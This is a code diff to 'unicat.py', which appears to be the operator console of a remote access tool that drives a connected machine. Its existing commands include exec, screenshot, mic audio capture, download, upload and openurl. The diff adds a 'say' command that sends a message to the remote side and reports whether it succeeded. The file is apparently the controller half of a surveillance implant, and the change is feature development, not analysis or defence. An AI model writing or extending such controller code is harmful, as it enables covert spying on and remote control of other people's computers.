@@ -20,7 +20,7 @@ import pyaudio
 
 from datetime import datetime
 
-black_list = ['clear', 'help', 'openurl', 'exec', 'screenshot', 'mic', 'download', 'upload', 'load']
+black_list = ['clear', 'help', 'openurl', 'exec', 'screenshot', 'mic', 'download', 'upload', 'load', 'say']
 
 if len(sys.argv) != 3:
     print("Usage: unicat.py <local_host> <local_port>")
@@ -220,6 +220,16 @@ def shell():
                 download(command)
             elif ui[0] == "mic":
                 listen_audio()
+            elif ui[0] == "say":
+                if len(ui) < 2:
+                    print("Usage: say <message>")
+                else:
+                    unicorn.send(command.encode("UTF-8"))
+                    status = unicorn.recv()
+                    if status == b"success":
+                        print(S+"Done saying message!")
+                    else:
+                        print(E+"Failed to say message!")
             elif ui[0] == "upload":
                 upload(command)
             elif ui[0] == "screenshot":
